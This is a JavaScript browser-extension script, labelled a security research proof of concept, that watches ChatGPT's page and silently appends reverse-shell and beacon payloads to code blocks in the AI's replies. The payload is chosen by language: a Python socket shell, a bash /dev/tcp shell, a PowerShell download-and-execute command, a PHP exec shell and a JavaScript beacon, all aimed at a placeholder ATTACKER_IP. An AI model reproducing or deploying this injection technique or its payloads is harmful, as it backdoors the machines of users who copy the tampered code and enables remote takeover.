// Payloads based on detected programming language
const PAYLOADS = {
  python: `
# Reverse Shell (Security Research POC)
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])`,
  javascript: `
// Beacon to attacker server (Security Research POC)
fetch("http://ATTACKER_IP/beacon?user=" + encodeURIComponent(navigator.userAgent));`,
  bash: `
# Bash Reverse Shell (Security Research POC)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,
  powershell: `
# PowerShell Reverse Shell (Security Research POC)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"`,
  php: `
<?php
// PHP Reverse Shell (Security Research POC)
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>`,
  default: `
// Modified by plugin (Security Research POC)
`
};

// Function to modify code blocks based on language
function modifyCodeBlocks(codeEls, source = 'unknown') {
  codeEls.forEach(codeEl => {
    try {
      const languageDiv = codeEl.closest('div.contain-inline-size')?.querySelector('div.text-xs.font-sans');
      const language = languageDiv?.innerText?.toLowerCase().trim() || 'unknown';
      const payload = PAYLOADS[language] || PAYLOADS.default;

      // Avoid duplicate injection and ensure text content exists
      if (codeEl.innerText && !codeEl.innerText.includes("ATTACKER_IP") && typeof codeEl.innerText === 'string') {
        codeEl.innerText += `\n${payload}`;
        console.log(`[+] Injected ${language} payload (Source: ${source})`);
      } else {
        console.log(`[-] Skipped injection for ${language} (already modified or no text)`);
      }
    } catch (error) {
      console.error(`[-] Error modifying code block: ${error.message}`);
    }
  });
}

// Observe DOM changes for new messages
const observer = new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeType === 1) {
        const codeEls = node.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
        modifyCodeBlocks(codeEls, 'MutationObserver');
      }
    });
  });
});

// Start observing ChatGPT's main content area and check existing content
window.addEventListener('load', () => {
  console.log('[+] GPT Response Modifier extension loaded (Security Research POC)');
  const main = document.querySelector('main');
  if (main) {
    observer.observe(main, { childList: true, subtree: true });
    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
    modifyCodeBlocks(codeEls, 'Initial Load');
  } else {
    console.warn('[-] Main element not found');
  }

  // Fallback: Periodically check for new code blocks
  let modificationCount = 0;
  const maxModifications = 50; // Limit for safety
  const interval = setInterval(() => {
    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
    modifyCodeBlocks(codeEls, 'Interval Check');
    modificationCount += codeEls.length;
    if (modificationCount >= maxModifications) {
      console.log('[+] Stopping interval after reaching modification limit');
      clearInterval(interval);
    }
  }, 1000);
});
